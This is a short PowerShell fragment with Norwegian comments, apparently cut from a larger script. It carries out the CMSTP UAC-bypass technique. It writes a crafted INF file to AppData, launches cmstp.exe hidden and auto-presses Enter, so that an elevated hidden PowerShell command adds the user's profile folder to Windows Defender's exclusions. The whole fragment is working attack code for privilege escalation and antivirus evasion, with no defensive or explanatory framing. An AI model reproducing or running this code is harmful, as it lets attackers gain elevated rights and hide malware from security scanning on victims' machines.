$InfPath = "$env:APPDATA\cmstp.inf"
$InfContent = @"
[version]
Signature=`$chicago`$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Set-MpPreference -ExclusionPath $env:USERPROFILE"
taskkill /IM cmstp.exe /F

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%SystemRoot%\System32\cmd.exe", ""
"@

# Lagre INF-filen
$InfContent | Out-File $InfPath -Encoding ASCII

# Start UAC-bypass
Start-Process "C:\Windows\System32\cmstp.exe" -ArgumentList "/au $InfPath" -WindowStyle Hidden

[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
}
